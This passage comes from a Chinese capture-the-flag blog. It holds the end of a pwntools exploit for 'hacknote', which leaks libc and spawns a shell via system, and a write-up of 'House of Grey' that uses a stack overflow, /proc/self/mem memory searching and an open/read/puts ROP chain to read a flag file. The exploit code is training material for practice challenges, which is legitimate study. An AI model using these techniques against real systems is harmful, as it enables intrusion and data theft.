class="string">&quot;111.198.29.45&quot;</span></span><br><span class="line">remotePort = <span class="number">32693</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">LIB   = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">pd32  = <span class="keyword">lambda</span> x : p32(x).decode() <span class="comment">#python3 not surport str + bytes</span></span><br><span class="line">pd64  = <span class="keyword">lambda</span> x : p64(x).decode()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(x)</span><br><span class="line">db    = <span class="keyword">lambda</span>   : gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad</span>(<span class="params">size, text</span>):</span></span><br><span class="line">	sa(<span class="string">&#x27;Your choice :&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	sa(<span class="string">&#x27;Note size :&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">	sa(<span class="string">&#x27;Content :&#x27;</span>, text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span>(<span class="params">index</span>):</span></span><br><span class="line">	sa(<span class="string">&#x27;Your choice :&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	sa(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dp</span>(<span class="params">index</span>):</span></span><br><span class="line">	sa(<span class="string">&#x27;Your choice :&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	sa(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(index))	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">q</span>():</span></span><br><span class="line">	sa(<span class="string">&#x27;Your choice :&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	<span class="comment">#li(rl())</span></span><br><span class="line">	ad(<span class="number">0x10</span>, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">	ad(<span class="number">0x10</span>, <span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">	rm(<span class="number">0</span>)</span><br><span class="line">	rm(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	dump_addr = <span class="number">0x0804862B</span></span><br><span class="line">	ad(<span class="number">0x8</span>, p32(dump_addr) + p32(exe.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">	dp(<span class="number">0</span>)</span><br><span class="line">	puts_addr = u32(r(<span class="number">4</span>))</span><br><span class="line">	li(<span class="string">&#x27;puts_addr: &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">	libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">	libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">	sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">	<span class="comment"># get shell</span></span><br><span class="line">	rm(<span class="number">2</span>)</span><br><span class="line">	ad(<span class="number">0x8</span>, p32(sys_addr) + <span class="string">&#x27;; sh&#x27;</span>)</span><br><span class="line">	dp(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">			io = exe.process(env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = exe.process()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		io = remote(remoteIp, remotePort)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">	</span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/04/08/wp-hacknote/" data-id="ckhemv82m002xwdcma3tnhp39" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-wp-house-of-grey" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/04/08/wp-house-of-grey/" class="article-date">
  <time datetime="2020-04-08T12:51:44.000Z" itemprop="datePublished">2020-04-08</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/04/08/wp-house-of-grey/">wp house of grey</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="House-Of-Grey"><a href="#House-Of-Grey" class="headerlink" title="House Of Grey"></a>House Of Grey</h1><h2 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h2><p>World of Attack &amp; Defense</p>
<h2 id="难度"><a href="#难度" class="headerlink" title="难度"></a>难度</h2><p>8 / 10</p>
<h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h2 id="简单描述"><a href="#简单描述" class="headerlink" title="简单描述"></a>简单描述</h2><p>该题没有明显的分界点, 涉及的知识也比较陌生,十分经典. 通过创建子进程方式避免被直接调试,且有记时,保护全开,要理解linux下的一些文件.如 /proc/self/下的文件,通过seccomp-tools检验程序, 发现禁用execve函数,只能通过open,read,write获取flag</p>
<h2 id="vul"><a href="#vul" class="headerlink" title="vul"></a>vul</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">fn</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-64h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-64h]</span></span><br><span class="line">  <span class="keyword">void</span> *v6; <span class="comment">// [rsp+20h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">24</span>]; <span class="comment">//---------------------stack ouverflow</span></span><br><span class="line">  <span class="keyword">void</span> *v8; <span class="comment">// [rsp+48h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">char</span> nptr; <span class="comment">// [rsp+50h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+80h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You get into my room. Just find something!\n&quot;</span>);</span><br><span class="line">  v6 = <span class="built_in">malloc</span>(<span class="number">100000u</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( !v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;malloc&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_14D2(<span class="number">100000L</span>L) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  v8 = v6;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">29</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_FEE();</span><br><span class="line">    <span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;savedregs )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;So man, what are you finding?&quot;</span>);</span><br><span class="line">       <span class="comment">//length 40 can be stack overflow--------</span></span><br><span class="line">        buf[(<span class="keyword">signed</span> <span class="keyword">int</span>)((<span class="keyword">unsigned</span> __int64)read(<span class="number">0</span>, buf, <span class="number">40u</span>LL) - <span class="number">1</span>)] = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)check(buf) )<span class="comment">//不能读取flag文件</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Man, don&#x27;t do it! See you^.&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        fd = open(buf, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>: </span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;So, Where are you?&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, &amp;nptr, <span class="number">0x20</span>uLL);</span><br><span class="line">        v1 = strtoull(&amp;nptr, <span class="number">0L</span>L, <span class="number">10</span>);</span><br><span class="line">        lseek(fd, v1, <span class="number">0</span>); <span class="comment">//可以定位fd的地址</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;How many things do you want to get?&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, &amp;nptr, <span class="number">8u</span>LL);</span><br><span class="line">        v4 = atoi(&amp;nptr);</span><br><span class="line">        <span class="keyword">if</span> ( v4 &lt;= <span class="number">100000</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = read(fd, v8, v4);</span><br><span class="line">          <span class="keyword">if</span> ( v5 &lt; <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;error read&quot;</span>);</span><br><span class="line">            perror(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;You get something:&quot;</span>);</span><br><span class="line">          write(<span class="number">1</span>, v8, v5);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;You greedy man!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;What do you want to give me?&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, v8, <span class="number">0x200</span>uLL);                  <span class="comment">// v8 can be modifyed</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nI guess you don&#x27;t want to say Goodbye!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;But sadly, bye! Hope you come again!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vul: 存在堆栈溢出, 通过覆盖 v8实现任意地址读写</p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>由于可以读取除了flag之外的文件，就可以读取/proc/self/maps文件,Linux 内核提供了一种通过 /proc 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制。proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。读取/proc/self/maps可以得到当前进程的内存映射关系，通过读该文件的内容可以得到内存代码段基址。/proc/self/mem是进程的内存内容，通过修改该文件相当于直接修改当前进程的内存。该文件不能直接读取，需要结合maps的映射信息来确定读的偏移值。即无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取内存内容。</p>
<p>程序最后有一个exit(0)，由此，覆盖fn函数的返回地址来构造ROP不可行，但可以覆盖read函数的返回地址，也就是调用read任意写时，把自己的返回地址给覆盖了,这样ROP写入后就直接开始执行了。为了覆盖read的返回地址，就需要确定栈的地址。</p>
<p>但是，由于程序是clone出来的，第三个参数指定了clone出的进程的栈地址，程序一开始用mmap映射了一段内存，然后取了其中的一个随机的位置传给了clone，由此，并不知道程序的栈地址。但是，可以通过读取/proc/self/mem文件，来搜索标记，已确定程序的栈地址, 注意,堆栈的生长方向是由高地址向低地址生长。</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol>
<li>如何调试? 使用ida把超时函数的exit给patch掉, 通过gdb attach的方式调试子进程</li>
<li>漏洞 1: 明显的漏洞点就在执行1功能的时候就有字符串溢出, 可以覆盖v8变量通过4功能实现任意地址写入.</li>
<li>漏洞 2: 可以通过输入打开文件为 /proc/self/maps来获取各个基址</li>
<li>绕过PIE，以及利用/proc/self/mem来读取任意地址的内容</li>
<li>通过在/proc/self/mem中搜索’/proc/self/maps’字符串来定位堆栈的地址</li>
<li>计算出read ret地址,构造rop链读取flag</li>
</ol>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="获取基址"><a href="#获取基址" class="headerlink" title="获取基址"></a>获取基址</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">sla(<span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leaking base addr</span></span><br><span class="line">p = <span class="string">&#x27;/proc/self/maps&#x27;</span></span><br><span class="line">fid(p)</span><br><span class="line">get(<span class="number">1500</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;You get something:\n&#x27;</span>)</span><br><span class="line">exe_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">ru(<span class="string">&#x27;[heap]\n&#x27;</span>)</span><br><span class="line">stack_start = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">ru(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">stack_end =   <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;rw-p 00000000 00:00 0 \n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">li(<span class="string">&#x27;exe_base  &#x27;</span> + <span class="built_in">hex</span>(exe_base))</span><br><span class="line">li(<span class="string">&#x27;libc_base &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">li(<span class="string">&#x27;stack_start &#x27;</span> + <span class="built_in">hex</span>(stack_start))</span><br><span class="line">li(<span class="string">&#x27;stack_end   &#x27;</span> + <span class="built_in">hex</span>(stack_end))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret_offset = <span class="number">0x1823</span></span><br><span class="line">pop_rsi_r15_ret_offset = <span class="number">0x1821</span></span><br><span class="line">pop_rdi_ret = exe_base + pop_rdi_ret_offset</span><br><span class="line">pop_rsi_r15_ret = exe_base + pop_rsi_r15_ret_offset</span><br><span class="line">open_plt = exe_base + exe.plt[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_plt = exe_base + exe.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts_plt = exe_base + exe.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br></pre></td></tr></table></figure>



<h3 id="搜索内存定位read-ret地址"><a href="#搜索内存定位read-ret地址" class="headerlink" title="搜索内存定位read ret地址"></a>搜索内存定位read ret地址</h3><p>接下来，就需要读取/proc/self/mem来搜索内存，确定栈地址了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">29</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_FEE();</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure>

<p>通过以上逻辑,程序只可以循环使用30次, 前面使用了4次, ，最后还需要用2次,搜索内存只能使用24次.</p>
<p>而每次最多允许读取100000个字节的数据，由此，能搜索2400000个字节的内容，通过调试，观察数据的栈地址，计算它与stack_end的值的差值，做一个大致的范围,由于栈是从高往低增长的，因此，应该从stack_end – x ~ stack_end搜索</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#position stack addr</span></span><br><span class="line">offset = <span class="number">0xf800000</span></span><br><span class="line">li(<span class="string">&#x27;debug---------------&#x27;</span>)</span><br><span class="line"><span class="comment">#begin_offset ~ stack_end</span></span><br><span class="line">stack_begin_offset = stack_end - offset - <span class="number">24</span> * <span class="number">100000</span></span><br><span class="line">li(<span class="string">&#x27;stack_begin_offset &#x27;</span> + <span class="built_in">hex</span>(stack_begin_offset))</span><br><span class="line">li(<span class="string">&#x27;stack_end   &#x27;</span> +        <span class="built_in">hex</span>(stack_end))</span><br><span class="line"></span><br><span class="line">fid(<span class="string">&#x27;/proc/self/mem&#x27;</span>)</span><br><span class="line">   <span class="comment">#打开该时起始地址为0,则偏移直接为stack_begin_offset地址</span></span><br><span class="line">loc(stack_begin_offset) <span class="comment">#loacate in stack_begin_offset</span></span><br><span class="line"><span class="comment"># searching</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">24</span>): <span class="comment">#内存搜索&#x27;/proc/self/mem&#x27;来定位栈地址.</span></span><br><span class="line">	get(<span class="number">100000</span>)</span><br><span class="line">	text = ru(<span class="string">&#x27;1.Find something&#x27;</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;/proc/self/mem&#x27;</span> <span class="keyword">in</span> text:</span><br><span class="line">		content = text.split(<span class="string">&#x27;/proc/self/mem&#x27;</span>)[<span class="number">0</span>] //若找到, 切割该字符串,获取前面的内容长度.</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">if</span> i == <span class="number">23</span>:</span><br><span class="line">		li(<span class="string">&#x27;not found&#x27;</span>)</span><br><span class="line">		exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">v8_addr = stack_begin_offset + i * <span class="number">100000</span> + <span class="built_in">len</span>(content) - <span class="number">0x14</span></span><br><span class="line">li(<span class="string">&#x27;v8_addr: &#x27;</span> + <span class="built_in">hex</span>(v8_addr))</span><br><span class="line"></span><br><span class="line">read_ret = v8_addr - (<span class="number">0x60</span> - <span class="number">0x08</span>) + <span class="number">0x20</span></span><br><span class="line">li(<span class="string">&#x27;read_ret: &#x27;</span> + <span class="built_in">hex</span>(read_ret))</span><br></pre></td></tr></table></figure>

<h3 id="构造rop链"><a href="#构造rop链" class="headerlink" title="构造rop链"></a>构造rop链</h3><p>在这里,只能通过写入read的 ret地址, 因为只有在刚读取完成之后, 返回的地址才不会被覆盖, 其他函数修改是被覆盖的,没有效果.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="string">&#x27;/proc/self/mem&#x27;</span>.ljust(<span class="number">24</span>, <span class="string">&#x27;\x00&#x27;</span>) + p64(read_ret)</span><br><span class="line">	fid(p) <span class="comment"># fd as 5</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">#rop</span></span><br><span class="line">    <span class="comment">#64位中 三个参数函数的传参方式</span></span><br><span class="line">	<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	read(fd, buf, length)</span></span><br><span class="line"><span class="string">	1 RDI  0x0  #fd</span></span><br><span class="line"><span class="string">	2 RSI  0x7fd5ffbc3640 ◂— &#x27;/proc/self/mem&#x27; #buf</span></span><br><span class="line"><span class="string">	3 RDX  0x28 #length</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span></span><br><span class="line">	ret = read_ret</span><br><span class="line">	<span class="comment">#open  ./flag</span></span><br><span class="line">	p = p64(pop_rdi_ret) + p64(ret + <span class="number">15</span> * <span class="number">8</span>)</span><br><span class="line">	p += p64(pop_rsi_r15_ret) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(open_plt)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># read flag to buffer, fd is 6</span></span><br><span class="line">	p += p64(pop_rdi_ret) + p64(<span class="number">6</span>)</span><br><span class="line">	p += p64(pop_rsi_r15_ret) + p64(ret + <span class="number">15</span> * <span class="number">8</span>) + p64(<span class="number">0</span>) + p64(read_plt)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># puts flag</span></span><br><span class="line">	p += p64(pop_rdi_ret) + p64(ret + <span class="number">15</span> * <span class="number">8</span>) + p64(puts_plt)</span><br><span class="line">	<span class="comment"># ./flag str will be replace flag&#123;***&#125;</span></span><br><span class="line">	<span class="comment">#p = p64(pop_rdi_ret) + p64()</span></span><br><span class="line">	p += <span class="string">&#x27;./flag\x00&#x27;</span></span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line">	</span><br><span class="line">	giv(p)</span><br></pre></td></tr></table></figure>



<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span 